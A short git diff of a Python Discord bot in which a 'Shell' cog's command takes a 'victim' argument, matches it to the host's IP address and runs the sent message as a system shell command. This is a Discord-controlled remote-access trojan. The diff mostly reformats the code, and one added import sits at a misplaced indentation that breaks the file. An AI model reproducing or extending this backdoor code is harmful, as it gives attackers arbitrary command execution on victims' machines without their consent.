@@ -2,6 +2,7 @@ import disnake as discord
 from disnake.ext import commands
 from datetime import datetime
 
+            from threading import Thread
 import os, requests
 nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 
@@ -14,11 +15,16 @@ class Shell(commands.Cog):
     async def shell(self, ctx, victim, msg): 
         if str(victim) == str(self.ip_addr):
             await ctx.response.defer()
-            global status; status = None
-            from threading import Thread
+            
+            global status
+            status = None
+            
             def shell():
                 output = subprocess.run(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                global status; status = "ok"; return output
+                global status
+                status = "ok"
+                return output
+                
             shel = Thread(target=shell); shel._running = True; shel.start()
             time.sleep(2); shel._running = False
             if status:
